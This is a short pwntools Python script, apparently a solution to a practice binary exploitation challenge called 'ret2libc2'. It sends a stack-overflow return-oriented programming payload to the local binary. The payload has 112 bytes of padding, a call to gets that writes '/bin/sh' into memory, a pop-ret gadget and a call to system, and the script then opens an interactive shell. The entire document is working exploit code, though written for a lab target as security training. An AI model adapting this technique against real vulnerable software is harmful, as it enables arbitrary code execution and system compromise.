from pwn import *

_gets_plt = 0x08048460
_bin_sh = 0x0804A080
_system = 0x08048641
_pop_ret = 0x0804843D

payload = (
    b"a" * 112
    + p32(_gets_plt)
    + p32(_pop_ret)
    + p32(_bin_sh)
    + p32(_system)
    + p32(_bin_sh)
)


sh = process("./bin/ret2libc2")
sh.sendline(payload)
sh.sendline("/bin/sh")
sh.interactive()
